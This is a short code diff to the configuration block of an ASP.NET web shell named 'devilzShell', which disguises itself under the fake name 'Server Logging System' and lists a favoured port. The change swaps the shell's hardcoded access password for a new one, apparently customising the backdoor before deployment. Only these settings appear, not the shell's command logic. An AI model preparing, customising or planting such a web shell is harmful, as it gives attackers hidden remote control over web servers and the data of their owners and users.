@@ -15,7 +15,7 @@ Dim shell_name As String = "devilzShell"
 Dim shell_fake_name As String = "Server Logging System"
 Dim shell_title As String = " :: " & shell_name & " ::"
 Dim shell_version As String = "v1"
-Dim shell_password As String = "devilzc0der"
+Dim shell_password As String = "Admin1337"
 Dim shell_fav_port As String = "12345"
 Dim shell_color As String = "#374374"
 </script>
